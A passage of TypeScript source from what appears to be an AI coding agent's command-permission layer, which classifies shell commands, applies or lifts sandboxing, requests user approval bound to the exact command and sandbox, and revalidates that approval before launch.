      // Codex-style classification (ADR 0040); a parser that cannot load fails closed.
      const ready = await ensureShellParser();
      signal?.throwIfAborted();
      prepared.classification = classifyCommand(
        command,
        prepared.shell ?? 'bash',
        shellParsers,
        ready,
        this.options.workspace.root,
      );
      // A command excluded from the sandbox runs unsandboxed under the normal permission flow.
      if (this.excludedFromSandbox(prepared) && prepared.sandbox) {
        prepared.excluded = true;
        prepared.sandbox.mode = 'danger-full-access';
        prepared.sandbox.network = true;
        prepared.sandbox.unsandboxed = true;
        delete prepared.sandbox.writableRoots;
        delete prepared.sandbox.denyRead;
        delete prepared.sandbox.denyWrite;
      }
    }
    const decision = this.commandDecision(prepared, file);
    // After exclusions and escape selection, reject an impossible sandboxed launch before asking.
    // Keep policy denials (including plan/read-only) on their existing permission path.
    if (
      !prepared.stdin &&
      !prepared.sandbox?.unsandboxed &&
      decision.effect !== 'deny' &&
      sandboxConfig(this.options).permissionMode !== 'plan' &&
      !this.options.analysisOnly?.() &&
      !runtime.availability().ok
    ) {
      audit({target: label, phase: 'decided', decision: 'deny', reason: 'sandbox-unavailable'});
      return {
        gate: {
          status: 'error',
          code: 'SANDBOX_UNAVAILABLE',
          content: 'The command sandbox is unavailable. Nothing was run.',
          target: label,
        },
        viaSession: false,
      };
    }
    const grant = this.commandGrant(prepared);
    let commandSandbox: ApprovalRequest['commandSandbox'] =
      prepared.stdin?.launch.unsandboxed && !sandboxConfig(this.options).enabled ? 'disabled' : undefined;
    let sandbox = prepared.stdin?.launch.unsandboxed ? 'sandbox off' : runtime.label;
    if (prepared.sandbox) {
      if (prepared.escalation || prepared.excluded) {
        commandSandbox = prepared.escalation ? 'escape' : 'excluded';
        sandbox = 'NO SANDBOX';
      } else if (prepared.sandbox.unsandboxed) {
        commandSandbox = 'disabled';
        sandbox = 'sandbox off';
      } else {
        commandSandbox = 'sandboxed';
        sandbox = `${runtime.label} · ${prepared.sandbox.mode === 'read-only' ? 'read-only' : 'sandboxed'}`;
      }
    }
    const authorization = await this.permission(
      decision,
      {
        tool: prepared.toolName ?? 'exec_command',
        capability: 'process.execute',
        target: command,
        workdir: prepared.outsideCwd ? file.absolute : file.relative,
        sandbox,
        ...(commandSandbox ? {commandSandbox} : {}),
        // The approval is bound to exactly this command, directory and sandbox (ADR 0055).
        scopeKey: grant,
        reason: decision.reason,
        ...(prepared.escalation ? {unsandboxed: true} : {}),
        ...(prepared.excluded ? {excluded: true} : {}),
        ...(prepared.classification?.dangerous ? {dangerous: true} : {}),
        ...(prepared.justification ? {justification: this.options.redact(prepared.justification)} : {}),
        ...(prepared.classification
          ? {commands: prepared.classification.commands?.map(commandText) ?? null}
          : prepared.stdin
            ? {}
            : {commands: null}),
      },
      grant,
      label,
      audit,
      decision.reason === 'stdin-policy-tightened'
        ? 'This terminal was launched with broader permissions than the current sandbox allows; start a new command instead. Nothing was sent.'
        : decision.reason === 'unsandboxed-forbidden'
          ? 'Running a command without the sandbox is not allowed (sandbox.allowUnsandboxedCommands is false). Nothing was run. Work inside the sandbox or ask the user to change the setting.'
          : `Command denied by policy (${decision.reason}). Nothing was run.`,
      prepared.escalation
        ? 'The user denied running this command without the sandbox. Nothing was run.'
        : 'The user denied running this command. Nothing was run.',
      signal,
    );
    return authorization;
  }

  private revalidateCommand(
    prepared: Extract<PreparedTool, {kind: 'command'}>,
    viaSession: boolean,
    audit: Audit,
  ): ToolOutput | null {
    const {file, runtime, runtimeId, label} = prepared;
    const grant = this.commandGrant(prepared);
    const again = resolveWorkspacePath(this.options, prepared.workdir);
    const current = this.commandDecision(prepared, again);
    // The configured sandbox is part of the approval: a change before launch voids it (no retrofit).
    const config = sandboxConfig(this.options);
    const sandboxChanged =
      !!prepared.sandbox &&
      (prepared.escalation
        ? !config.enabled || !config.allowUnsandboxed
        : prepared.excluded
          ? !this.excludedFromSandbox({
              ...prepared,
              excluded: false,
              sandbox: {...prepared.sandbox, unsandboxed: false},
            })
          : effectiveSandboxMode(this.options, runtime) !== prepared.sandbox.mode);
    if (
      again.absolute !== file.absolute ||
      again.kind !== 'directory' ||
      outsideWorkingDirectories(this.options, again.absolute) !== prepared.outsideCwd ||
      current.effect === 'deny' ||
      sandboxChanged ||
      runtime.id !== runtimeId ||
      (viaSession && !this.options.grants.has('process.execute', grant))
    ) {
      audit({
        target: label,
        phase: 'decided',
        decision: 'deny',
        reason: sandboxChanged ? 'sandbox-changed' : 'revalidation',
      });
      return {
        status: 'denied',
        code: 'DENIED',
        content: sandboxChanged
          ? 'The command was not run: the sandbox policy changed after approval. Request it again under the current policy.'
          : 'The command was not run: its approval or working directory changed before launch.',
        target: label,
      };
    }
    if (prepared.sessionId && !runtime.session?.(prepared.sessionId))
      return {
        status: 'denied',
        code: 'SESSION_EXPIRED',
        content: 'The session expired before input approval. Nothing was sent.',
        target: label,
      };
    if (!prepared.stdin && !prepared.sandbox?.unsandboxed && !runtime.availability().ok)
      return {
        status: 'error',
        code: 'SANDBOX_UNAVAILABLE',
        content: 'The command sandbox is unavailable. Nothing was run.',
        target: label,
      };
    return null;
  }
}
